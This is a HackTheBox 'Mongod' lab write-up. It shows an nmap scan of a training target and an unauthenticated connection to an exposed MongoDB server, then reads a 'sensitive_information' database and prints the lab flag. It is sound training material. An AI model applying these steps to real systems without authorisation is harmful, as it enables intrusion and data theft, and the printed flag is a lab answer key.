## Mongod HackTheBox
#### Short Bio
Super cool room on MongoDB and how to access it via CLI. **You will learn:**
- MongoDB
- MongoDB commands
- Structures of DB
___

#### `Nmap` Time:
```bash
nmap -v -A -sV --privileged -T4 10.129.228.30 -p- -O -sC
```
**`Result`**
|PORT|STATE|SERVICE|VERSION|
|---|---|---|---|
|22/tcp|open|ssh|OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)|
|27017/tcp|open|mongodb|MongoDB 3.6.8|

The Nmap result is really big for this page, so I've create a seperate doc for it [here](./nmap)
We have Mongo DB and SSH open. Cool.

---
#### Accessing MongoDB
MongoDB has it's own support for cli access which is `mongo`. <br>
```bash
# To install:
apt install mongodb-clients -y

# To connect with out pass/ user:
mongo "mongodb://10.129.228.30:27017"

```
Wait a moment, don't make mistake by thinking that this is a normal shell. It's not, you need special commands specific for mongo db.

Well how do you know that? easy, just type `help`.
You will get all the commands you need.

---

#### Getting Flag
- First we will check all the available DBs. **Command** : : `show dbs`
- we have bunch of dbs and all of them are interesting. But we know which one to check (sensitive_information)
- to use this type: `use sensitive_information`
- Now we need to see whats inside. Type: `show collections` and we can see a collection called `flag`. Now we need to get the contents of the `flag`.
- Befor viewing the contents we need to know what command to use. for that, type: `db.flag.help()`
- we get a command like this:
```terminal
db.flag.find([query],[fields]) - query is an optional query filter. fields is optional set of fields to 

e.g. db.flag.find( {x:77} , {name:1, x:1} )
```
so, lets try: `db.flag.find()` and we got:
```js
> db.flag.find()
{ "_id" : ObjectId("630e3dbcb82540ebbd1748c5"), "flag" : "1b6e6fb359e7c40241b6d431427ba6ea" }
```
Done

